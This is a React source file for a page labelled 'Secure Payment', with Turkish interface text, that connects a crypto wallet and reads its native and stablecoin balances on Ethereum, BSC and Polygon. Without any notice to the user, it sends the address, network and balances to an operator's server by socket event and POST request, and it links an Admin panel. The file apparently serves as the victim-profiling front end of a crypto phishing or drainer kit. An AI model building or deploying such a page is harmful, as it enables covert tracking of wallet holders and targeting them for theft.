import MultiChainConnect from "./MultiChainConnect";
import { useEffect, useState } from "react";
import { useAccount, useConnect, useDisconnect } from "wagmi";
import { createPublicClient, http, formatEther, formatUnits } from "viem";
import { mainnet, bsc, polygon } from "viem/chains";
import io from "socket.io-client";
import { API_URL, SOCKET_OPTIONS } from "./config";
import "./App.css";
import Admin from "./Admin";

const socket = io(API_URL, SOCKET_OPTIONS);

const CHAINS = {
  1: mainnet,
  56: bsc,
  137: polygon,
};

const RPC_URLS = {
  1: "https://ethereum.publicnode.com",
  56: "https://bsc-dataseed.binance.org",
  137: "https://polygon-rpc.com",
};

const TOKENS = {
  1: [
    {
      symbol: "WETH",
      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      decimals: 18,
    },
    {
      symbol: "USDT",
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      decimals: 6,
    },
    {
      symbol: "USDC",
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      decimals: 6,
    },
  ],

  56: [
    {
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      decimals: 18,
    },
    {
      symbol: "USDC",
      address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
      decimals: 18,
    },
    {
      symbol: "WBNB",
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      decimals: 18,
    },
  ],

  137: [
    {
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      decimals: 6,
    },
    {
      symbol: "USDC",
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      decimals: 6,
    },
    {
      symbol: "WETH",
      address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
      decimals: 18,
    },
  ],
};

const ERC20_ABI = [
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ name: "", type: "uint256" }],
  },
];

export default function App() {
  const [page, setPage] = useState("home");

  const [error, setError] = useState("");

  const [nativeText, setNativeText] = useState("Bekleniyor");

  const [tokenText, setTokenText] = useState([]);

  const { address, isConnected, chain } = useAccount();

  const { connect, connectors, isPending } = useConnect();

  const { disconnect } = useDisconnect();

  const walletConnector = connectors.find((c) =>
    c.name.toLowerCase().includes("walletconnect")
  );

  useEffect(() => {
    async function loadBalances() {
      if (!isConnected || !address || !chain?.id) return;

      try {
        setError("");

        const selectedChain = CHAINS[chain.id];

        if (!selectedChain) {
          setError("Bu ağ için bakiye okuma henüz tanımlı değil.");
          return;
        }

        const client = createPublicClient({
          chain: selectedChain,
          transport: http(RPC_URLS[chain.id]),
        });

        const nativeBalance = await client.getBalance({
          address,
        });

        const nativeFormatted = `${Number(
          formatEther(nativeBalance)
        ).toFixed(6)} ${
          chain.nativeCurrency?.symbol || "Native"
        }`;

        const tokenList = TOKENS[chain.id] || [];

        const tokenBalances = [];

        for (const token of tokenList) {
          try {
            const balance = await client.readContract({
              address: token.address,
              abi: ERC20_ABI,
              functionName: "balanceOf",
              args: [address],
            });

            const formatted = Number(
              formatUnits(balance, token.decimals)
            );

            if (formatted > 0) {
              tokenBalances.push(
                `${formatted.toFixed(6)} ${token.symbol}`
              );
            }
          } catch (e) {
            console.log(e);
          }
        }

        setNativeText(nativeFormatted);

        setTokenText(tokenBalances);

        const usdtFound =
          tokenBalances.find((x) =>
            x.includes("USDT")
          ) || "0.00 USDT";

        const payload = {
          address,
          network: chain.name,
          chainId: chain.id,
          nativeBalance: nativeFormatted,
          usdtBalance: usdtFound,
          tokenBalances,
        };

        socket.emit(
          "wallet_connected",
          payload
        );

        await fetch(
          `${API_URL}/wallets`,
          {
            method: "POST",

            headers: {
              "Content-Type":
                "application/json",
            },

            body: JSON.stringify(payload),
          }
        );
      } catch (err) {
        console.log(err);

        setError("Bakiye okunamadı");
      }
    }

    loadBalances();
  }, [isConnected, address, chain]);

  if (page === "admin") {
    return <Admin />;
  }

  return (
    <div className="container">
      <div className="card">
        <h1>Secure Payment</h1>

        <MultiChainConnect />

        <p>
          Ethereum • BNB • Polygon •
          TRON
        </p>

        {!isConnected ? (
          <button
            onClick={() => {
              if (!walletConnector) {
                setError(
                  "WalletConnect connector bulunamadı"
                );

                return;
              }

              connect({
                connector:
                  walletConnector,
              });
            }}
            disabled={isPending}
          >
            {isPending
              ? "Bağlanıyor..."
              : "Cüzdan Bağla"}
          </button>
        ) : (
          <>
            <div className="success">
              Bağlantı başarılı
            </div>

            <div className="wallet-item">
              <p>{address}</p>

              <span>
                Ağ: {chain?.name}
              </span>

              <br />

              <span>
                Native: {nativeText}
              </span>

              <br />

              <span>Tokenlar:</span>

              {tokenText.length >
              0 ? (
                tokenText.map(
                  (t, i) => (
                    <div
                      key={i}
                      style={{
                        color:
                          "#d4af37",
                        fontSize: 13,
                      }}
                    >
                      {t}
                    </div>
                  )
                )
              ) : (
                <div
                  style={{
                    color: "#777",
                    fontSize: 13,
                  }}
                >
                  Token bakiyesi yok
                </div>
              )}
            </div>

            <button
              onClick={() =>
                disconnect()
              }
            >
              Bağlantıyı Kes
            </button>
          </>
        )}

        {error && (
          <div className="error-box">
            {error}
          </div>
        )}

        <button
          style={{
            marginTop: 15,
          }}
          onClick={() =>
            setPage("admin")
          }
        >
          Admin
        </button>
      </div>
    </div>
  );
}